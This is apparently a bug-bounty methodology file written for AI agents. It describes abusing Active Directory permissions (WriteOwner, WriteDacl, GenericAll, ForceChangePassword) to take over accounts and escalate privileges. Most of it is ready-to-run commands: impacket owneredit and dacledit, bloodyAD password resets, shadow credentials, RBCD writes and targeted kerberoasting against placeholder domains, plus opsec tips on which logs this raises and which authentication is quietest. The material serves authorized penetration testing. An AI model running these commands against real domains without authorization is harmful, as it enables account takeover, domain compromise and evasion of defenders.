---
technology: "AD ACL abuse (directory permissions)"
kind: bug-bounty-methodology
audience: ai-agent
family: directory-services
version: "1.0"
provenance: "corpus-mined (47 writeups across the edge-rights and abuse-tool gate families) + upstream-verified: BloodHound CE edge docs (bloodhound.specterops.io/resources/edges: generic-all, write-owner, force-change-password), bloodyAD README, fortra/impacket examples. Lab-safe placeholders throughout. Verified 2026-11-12. Supplement 2026-11-13: source: six2dez/pentest-book (post-exploitation/windows/ad/README.md and ad.md, no license — rewritten with attribution), accessed 2026-11-13; adds machine-account-creation and shadow-admin/hygiene recon."
---

# AD ACL abuse methodology

Target model: an AD domain (EXAMPLE.COM, DC at dc01.example.com), any authenticated
foothold — a user, a service account, or a machine account. Companion overview:
[[ad-acl|AD ACL abuse]]. Cross-unit: RBCD *use* is in the kerberos unit; cert-template
ACLs in ad-cs; GPO execution details in gpo.

## Triage table

| Right | Over | Primitive | Tool (prose) | Payoff |
|---|---|---|---|---|
| GenericAll | Group | add member | bloodyAD `add groupMember` / PowerView `Add-DomainGroupMember` | group's privileges |
| GenericAll | User | reset password · shadow creds · set SPN | `Set-DomainUserPassword` · bloodyAD `add shadowCredentials` · `Set-DomainObject -SET serviceprincipalname` | account takeover |
| GenericAll | Computer | write RBCD attribute | rbcd.py / bloodyAD `set rbcd` | impersonate anyone to that host |
| GenericAll | GPO / OU | evil GPO / inheritable ACE | SharpGPOAbuse, pyGPOAbuse; `New-ADObjectAccessControlEntry` | code exec on scope |
| GenericWrite | User/Group | targeted kerberoast · shadow creds · member add | `Set-DomainObject` · bloodyAD | credentials |
| WriteDacl | any | grant self GenericAll | impacket-dacledit · `Add-DomainObjectAcl` | full control |
| WriteOwner | any | become owner → rewrite DACL | impacket-owneredit · `Set-DomainObjectOwner` | full control |
| WriteProperty | Computer `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD grant | rbcd.py `write_rbcd` · bloodyAD `set rbcd` | kerberos unit chain |
| WriteProperty | specific attrs (dMSA links, etc.) | scope-local takeover | bloodyAD `set object` | varies |
| ForceChangePassword / AllExtendedRights | User | reset without old password | `Set-DomainUserPassword` / `Set-ADAccountPassword` · bloodyAD `set password` | account takeover |
| AddSelf / AddMember | Group | add yourself | bloodyAD `add groupMember` · `net group ... /add` (SMB/SAMR) | group's privileges |
| WriteSPN (WriteProperty on SPN) | User | targeted kerberoast | `Set-DomainObject -SET serviceprincipalname` | crack service-account pwd |

## Phase 0 — Collect

Graph collection first; this is nearly universal practice
(bloodhound-python from Linux — `bloodhound-python -d example.com -u user -p 'pass'
-ns 198.51.100.10 -c All` — or SharpHound in a PowerShell session). Without the
graph you are grepping LDAP blind; with it, "shortest path to Domain Admins /
high-value targets / kerberoastable users" is a saved query.

## Phase 1 — Find your edges

- BloodHound: select your principal → "Shortest Paths to High Value Targets";
  the built-in queries ("List all Kerberoastable Accounts", "Find Principals with
  DCSync Rights") cover the famous classes.
- Linux/no-GUI: enumerate what you can write — bloodyAD `get writable --trait
  <right>` (or its object dump) for a quick per-attribute verdict; PowerView
  `Get-DomainObjectAcl -Identity target -ResolveGUIDs` and
  `Find-InterestingDomainAcl` for the classic ACE sweep; one observed chain reads raw
  `ActiveDirectoryRights : Self, ReadProperty, WriteProperty` output this way.
- Always also check **ownership**: `Get-DomainObject <target> -Properties owner`
  or bloodyAD `get object`. Owner-of implies WRITE_DAC — the WriteOwner edge.

## Phase 2 — Abuse, per edge

### WriteOwner → WriteDacl → everything (the composed chain)

Shape, repeated across five observed engagements: take
ownership, grant yourself the right you actually want, exercise it, (optionally) restore.

```bash
# 1. owner: attacker becomes owner (works with -hashes / -k -no-pass for machine accts)
impacket-owneredit -action write -target 'target_user' -new-owner 'attacker' \
  -dc-ip 198.51.100.10 example.com/attacker:'Password123!'
#   (owneredit.py -k -no-pass for a Kerberos session;
#    PowerShell: Set-DomainObjectOwner -Identity target -OwnerIdentity me)

# 2. DACL: grant yourself FullControl / a scoped right (auto-backup .bak first)
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance \
  -principal 'attacker' -target-dn 'CN=target,CN=Users,DC=example,DC=com' \
  -dc-ip 198.51.100.10 example.com/attacker:'Password123!'
#   one observed chain grants 'WriteMembers' on a group then adds the machine account with bloodyAD;
#   PowerView equivalent:
#   Add-DomainObjectAcl -TargetIdentity target -Rights ResetPassword -PrincipalIdentity me

# 3. exercise: reset the password
python3 bloodyAD --host dc01.example.com -d example.com -u attacker -p 'Password123!' \
  set password target_user 'NewP@ss123!'
#   PowerView: Set-DomainUserPassword -Identity target -AccountPassword $sec;
#   RSAT: Set-ADAccountPassword -Identity target -Reset

# 4. restore: impacket-dacledit -action restore -file dacledit-<ts>.bak ... (undo your ACE)
```

### GenericAll / GenericWrite by object class

- **Group**: add yourself (bloodyAD `add groupMember <group> <user>`;
  PowerView `Add-DomainGroupMember`).
  With AddSelf the ACE only allows adding *yourself* — same move, narrower right.
- **User**: reset password (above) OR shadow credentials — bloodyAD
  `add shadowCredentials <user> --certificate <pem>` (seen against both managed
  and plain service accounts) → PKINIT auth as that principal
  (kerberos unit). OR targeted kerberoast: set an SPN then roast (below).
- **Computer**: RBCD — grant your controlled machine account
  (rbcd.py `-action write_rbcd -delegate-to <target> -delegate-from
  ATTACKER01$ -dc-ip ...`; or bloodyAD `set rbcd`) then run the
  S4U chain in the kerberos unit. Also read LAPS passwords if present.
- **GPO**: modify a GPO you fully control (immediate scheduled task) with
  SharpGPOAbuse/pyGPOAbuse and wait for refresh (GenericAll over
  Default Domain Policy; WriteDacl over the GPO-management OU).
- **OU**: add an inheritable GenericAll ACE over descendants (BloodHound CE's
  documented New-ADObjectAccessControlEntry pattern).

### Targeted kerberoast (WriteSPN / GenericWrite on a user)

```bash
# with write on servicePrincipalName of a user
python3 bloodyAD ... set object user servicePrincipalName 'x/target'   # or PowerView Set-DomainObject -SET
impacket-getTGT example.com/writer_user:...                            # then roast, see kerberos unit
impacket-GetUserSPNs example.com/roaster:'pass' -request -request-user target_user
```

### ForceChangePassword (extended right)

Direct, no old password needed: bloodyAD `set password`,
PowerView `Set-DomainUserPassword -Credential $Cred`,
or even `net user x New! /domain` — the last is
loud (command-line logging; BloodHound CE's opsec note says exactly this).

## Phase 3 — Opsec and events

- Permission modifications log **4670 and 4662** on the DC; password resets log
  **4724** (BloodHound CE edge opsec pages). Assume collection; prefer scoped
  rights over FullControl, and restore DACLs from the `.bak` dacledit wrote.
- Resetting a service account's password can break the service — prefer shadow
  credentials or targeted kerberoast when the account is live production.
- bloodyAD authenticates with password, NT hash (`-p :<hash>`), Kerberos ticket
  (`-k`) or certificate — pick the quietest you have (README-verified).

## Decision points

1. Edge found → object class first (the table), then tool by platform
   (Linux: impacket/bloodyAD; Windows: PowerView/RSAT).
2. Two viable edges → prefer reversible (DACL edit + restore, shadow creds)
   over destructive (password reset).
3. RBCD write obtained → switch units: the S4U2Self/S4U2Proxy chain, ticket
   request with `-impersonate`, and pass-the-ticket are in [[kerberos-bug-bounty|the kerberos methodology]].

## Supplement (2026-11-13) — pre-edges and shadow admins, from six2dez/pentest-book

Rewritten from six2dez/pentest-book (`post-exploitation/windows/ad/README.md` + `ad.md`, no license — rewritten with attribution), accessed 2026-11-13. Diff-first: the edge table, WriteOwner/WriteDacl composition, per-class GenericAll abuse, targeted kerberoast and the opsec notes were already here — these are the recon primitives the source adds around them.

**S1. Machine-account creation is the edge BEFORE the edge.** RBCD (Phase 2 / kerberos unit) needs a computer object you control. Two ways to get one, both worth checking when no direct edge exists: the domain-level `MachineAccountQuota` (default 10 — any authenticated user may create computer accounts; PowerView's `Get-DomainObject -Identity domain -Properties ms-ds-machineaccountquota`, then `New-MachineAccount` or `add-computer -domainname example.com -credential …` from a Windows foothold), or the `Add workstations to domain` right held by a group you are in. A `GenericAll` over an EXISTING computer (reset its machine password) substitutes when quota is zero.

**S2. Shadow-admin and account-hygiene audit — the greps that find edges BloodHound underweights.** With any valid credential, ldapdomaindump-style collection plus plain text filtering surfaces the misconfig classes that precede ACL abuse:

- `adminCount=1` users who left their privileged groups — the attribute is never decremented, so it flags *former* admins whose passwords predate their demotion (LDAP filter `(admincount=1)`, or `Get-ADObject -ldapfilter "(admincount=1)"`; jq over ldapdomaindump JSON: `select(.adminCount == [1])`). These are the shadow admins — often the weakest privileged path in the domain.
- `PASSWD_NOTREQD` accounts (userAccountControl bit 0x20 — `Get-ADUser -Filter {UserAccountControl -band 0x0020}`): may carry blank/simple passwords.
- `DONT_EXPIRE_PASSWD` (0x10000) on service accounts: a cracked password is permanent.
- Inactive-but-enabled accounts (stale lastLogon) and privileged users with overdue pwdLastSet — the spraying shortlist.

**S3. Tool delta.** aclpwn.py (Fox-IT) composes the escalation automatically from BloodHound data (ACL-abuse pathing with rollback) — a scripting alternative to walking Phase 2 by hand when the graph shows a multi-hop chain.
